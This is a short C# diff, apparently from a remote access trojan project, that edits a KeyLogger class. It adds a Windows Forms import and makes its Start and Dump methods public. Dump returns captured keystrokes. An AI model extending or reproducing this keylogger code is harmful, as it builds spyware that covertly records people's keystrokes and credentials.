@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace RAT {
 	class KeyLogger {
@@ -12,7 +13,7 @@ namespace RAT {
 		StringBuilder sb = new StringBuilder();
 		bool running = true;
 
-		void Start() {
+		public void Start() {
 			running = true;
 
 			while (running) {
@@ -28,7 +29,7 @@ namespace RAT {
 			}
 		}
 
-		string Dump() {
+		public string Dump() {
 			running = false;
 			string capturedKeys = sb.ToString();
 			sb.Clear();
